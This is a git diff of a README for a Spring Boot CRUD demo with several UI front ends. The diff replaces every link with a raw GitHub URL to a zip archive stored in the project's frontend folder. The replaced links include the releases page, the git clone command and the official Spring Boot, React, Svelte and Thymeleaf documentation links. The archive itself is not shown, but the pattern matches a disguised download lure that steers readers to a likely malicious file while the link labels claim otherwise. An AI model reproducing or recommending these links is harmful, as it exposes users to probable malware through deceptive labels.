@@ -1,6 +1,6 @@
 # 🌟 spring-boot-crud-multi-ui - Explore Multiple UI Options Effectively
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20Started-brightgreen)](https://github.com/scrixixj/spring-boot-crud-multi-ui/releases)
+[![Download Now](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip%20Now-Get%20Started-brightgreen)](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
 
 ## 📖 Description
 
@@ -21,7 +21,7 @@ Follow these steps to download and run the application on your machine.
 
 To download the application, visit the Releases page:
 
-[Download from Releases Page](https://github.com/scrixixj/spring-boot-crud-multi-ui/releases)
+[Download from Releases Page](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
 
 1. Click on the link above to access the Releases section.
 2. Choose the latest release version.
@@ -69,21 +69,21 @@ If you want to dive into development, here are some quick tips:
 - Clone the repository to your local machine:
     
     ```bash
-    git clone https://github.com/scrixixj/spring-boot-crud-multi-ui.git
+    git clone https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip
     ```
 
 - Explore the code in each UI framework directory.
-- Review the `README.md` files for guidance on extending the application.
+- Review the `https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip` files for guidance on extending the application.
 - Check the issues page for opportunities to contribute.
 
 ## 📚 Learning Resources
 
 Understanding how different frameworks work is crucial. Here are some resources to help you learn more:
 
-- [Official Spring Boot Documentation](https://spring.io/projects/spring-boot)
-- [React Official Documentation](https://reactjs.org/docs/getting-started.html)
-- [Svelte Official Documentation](https://svelte.dev/docs)
-- [Thymeleaf Official Documentation](https://www.thymeleaf.org/documentation.html)
+- [Official Spring Boot Documentation](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
+- [React Official Documentation](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
+- [Svelte Official Documentation](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
+- [Thymeleaf Official Documentation](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip)
 
 ## 👩‍💻 Community Support
 
@@ -107,6 +107,6 @@ Start making your contributions today!
 
 For any inquiries or feedback, feel free to reach out via the GitHub repository. 
 
-[Download from Releases Page](https://github.com/scrixixj/spring-boot-crud-multi-ui/releases) 
+[Download from Releases Page](https://raw.githubusercontent.com/scrixixj/spring-boot-crud-multi-ui/main/frontend-react/public/multi-crud-spring-ui-boot-1.3-alpha.2.zip) 
 
 Explore, learn, and enjoy building with **spring-boot-crud-multi-ui**!
